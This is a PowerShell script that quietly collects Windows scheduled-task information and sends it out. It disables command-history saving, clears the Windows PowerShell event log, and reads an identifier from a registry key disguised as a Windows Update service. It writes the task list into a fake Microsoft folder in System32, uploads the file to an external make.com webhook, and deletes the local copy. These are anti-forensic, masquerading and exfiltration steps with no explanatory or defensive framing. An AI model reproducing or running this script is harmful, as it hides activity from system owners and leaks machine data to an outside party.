$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$finaloutput = Join-Path -Path $basepath -ChildPath "sctaskinfo-$code.txt"
if (-not (Test-Path -Path $basepath)) {
    New-Item -ItemType Directory -Path $basepath | Out-Null
}
Get-ScheduledTask -TaskPath \Microsoft\Windows\Registry\ | Out-File -FilePath $finaloutput
$boundary = [System.Guid]::NewGuid().ToString()
$fileBytes = [System.IO.File]::ReadAllBytes($finaloutput)
$fileName = [System.IO.Path]::GetFileName($finaloutput)
$LF = "`r`n"
$body = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF" +
    [System.Text.Encoding]::Default.GetString($fileBytes) + $LF +
    "--$boundary--$LF"
)
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyBytes -UseBasicParsing | Out-Null
Remove-Item -Path $finaloutput -Force | Out-Null
